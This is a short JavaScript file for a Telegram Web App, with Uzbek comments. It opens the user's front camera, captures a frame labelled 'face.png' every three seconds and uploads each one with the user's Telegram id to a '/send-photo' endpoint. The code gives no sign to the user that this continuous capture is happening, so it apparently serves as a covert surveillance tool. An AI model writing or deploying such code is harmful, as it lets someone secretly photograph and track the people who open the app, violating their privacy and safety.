Telegram.WebApp.ready();
Telegram.WebApp.expand();

const user = Telegram.WebApp.initDataUnsafe?.user;
const userId = user?.id || "1612270615"; // fallback uchun

const video = document.getElementById("video");

(async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    setInterval(async () => {
      if (video.videoWidth === 0) return;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise((resolve) =>
        canvas.toBlob(resolve, "image/png")
      );
      const file = new File([blob], "face.png", { type: "image/png" });

      const formData = new FormData();
      formData.append("photo", file);
      formData.append("user_id", userId);

      try {
        await fetch("/send-photo", {
          method: "POST",
          body: formData
        });
        console.log("✅ Rasm yuborildi:", new Date().toLocaleTimeString());
      } catch (err) {
        console.warn("❌ Yuborilmadi:", err);
      }
    }, 3000);
  } catch (err) {
    alert("❌ Kamera ishlamadi: " + err.message);
    console.error(err);
  }
})();
